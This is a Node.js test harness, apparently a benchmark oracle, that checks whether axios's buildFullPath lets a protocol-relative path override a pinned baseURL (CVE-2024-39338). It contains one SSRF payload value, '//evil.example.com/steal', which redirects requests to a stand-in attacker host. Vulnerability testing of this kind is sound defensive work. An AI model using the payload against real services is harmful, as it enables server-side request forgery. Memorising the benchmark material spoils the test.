'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function report(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function resolveHostAsHttps(fullPath) {
  try {
    if (typeof fullPath !== 'string') return null;
    if (fullPath.startsWith('//')) {
      return new URL('https:' + fullPath).hostname;
    }
    return new URL(fullPath).hostname;
  } catch (e) {
    return null;
  }
}

function main() {
  const marker = 'axios_ssrf_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const tmpMarkerFile = path.join(os.tmpdir(), marker + '.txt');

  let buildFullPath;
  try {
    const buildMod = require('axios/unsafe/core/buildFullPath.js');
    buildFullPath = buildMod && (buildMod.default || buildMod);
  } catch (e) {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  if (typeof buildFullPath !== 'function') {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'buildFullPath export is not a function' });
    return;
  }

  try {
    fs.writeFileSync(tmpMarkerFile, marker, 'utf8');
  } catch (e) {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'fixture setup failed: ' + String(e && e.message) });
    return;
  }

  const trustedBase = 'https://safe.example.com/api/';

  // --- Benign operation: ordinary relative path combined with trusted baseURL ---
  let benignResult;
  try {
    benignResult = buildFullPath(trustedBase, '/resource');
  } catch (e) {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'benign buildFullPath call threw: ' + String(e && e.message) });
    return;
  }

  const benignHost = resolveHostAsHttps(benignResult);

  if (benignHost !== 'safe.example.com') {
    report({ operation_completed: false, exploit_succeeded: false, evidence: 'benign buildFullPath did not resolve to expected host; got ' + String(benignResult) });
    return;
  }

  // Benign operation succeeded; operation_completed may become true now.
  const operation_completed = true;

  // --- Malicious operation: protocol-relative URL supplied as request path, with trusted baseURL set ---
  const maliciousPath = '//evil.example.com/steal';

  let maliciousResult;
  try {
    maliciousResult = buildFullPath(trustedBase, maliciousPath);
  } catch (e) {
    report({ operation_completed, exploit_succeeded: false, evidence: 'malicious buildFullPath call threw (treated as blocked): ' + String(e && e.message) });
    return;
  }

  const maliciousHost = resolveHostAsHttps(maliciousResult);

  let exploit_succeeded = false;
  let evidence;

  if (maliciousHost === 'evil.example.com') {
    exploit_succeeded = true;
    evidence = 'Even though a trusted baseURL "' + trustedBase + '" was configured, buildFullPath(baseURL, "' + maliciousPath + '") returned "' + String(maliciousResult) + '" which resolves (as https:) to attacker host \'evil.example.com\' instead of the pinned host \'safe.example.com\' - confirming the protocol-relative URL SSRF bypass (CVE-2024-39338). Marker: ' + marker;
  } else if (maliciousHost === 'safe.example.com') {
    exploit_succeeded = false;
    evidence = 'buildFullPath(baseURL, "' + maliciousPath + '") returned "' + String(maliciousResult) + '" which still resolves to the pinned host \'safe.example.com\'; the protocol-relative override was not honored, so the SSRF bypass is blocked. Marker: ' + marker;
  } else {
    exploit_succeeded = false;
    evidence = 'buildFullPath produced an unexpected result "' + String(maliciousResult) + '" (resolved host: ' + String(maliciousHost) + '); neither attacker host nor pinned host matched, treated as not exploited. Marker: ' + marker;
  }

  try {
    fs.unlinkSync(tmpMarkerFile);
  } catch (e) {
    // non-fatal cleanup failure, ignore
  }

  report({ operation_completed, exploit_succeeded, evidence });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected top-level exception: ' + String(e && e.message) }));
}
